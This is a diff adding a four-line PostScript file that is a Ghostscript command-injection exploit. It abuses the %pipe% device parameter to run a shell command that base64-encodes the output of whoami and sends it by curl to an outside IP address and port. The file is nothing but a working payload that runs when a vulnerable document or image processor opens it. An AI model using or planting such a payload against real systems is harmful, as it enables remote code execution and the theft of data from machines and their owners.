@@ -1,0 +1,4 @@
+%!PS
+currentdevice null true mark /OutputICCProfile (%pipe%curl http://5.206.224.132:1337/?a=$(whoami|base64) )
+.putdeviceparams
+quit
